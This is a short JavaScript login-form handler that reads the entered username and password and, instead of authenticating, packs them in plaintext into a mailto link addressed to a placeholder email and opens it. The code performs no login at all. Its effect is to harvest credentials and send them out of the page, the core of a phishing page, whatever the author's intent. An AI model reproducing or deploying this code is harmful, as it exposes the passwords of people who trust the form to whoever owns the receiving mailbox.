document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission
  
    // Get form values
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
  
    // Perform validation
    if (username === "" || password === "") {
      alert("Please enter username and password");
      return;
    }
  
    // Send login details to email
    var emailBody = "Username: " + username + "\nPassword: " + password;
    var emailLink = "mailto:your-email@example.com?subject=Login Details&body=" + encodeURIComponent(emailBody);
    window.location.href = emailLink;
  });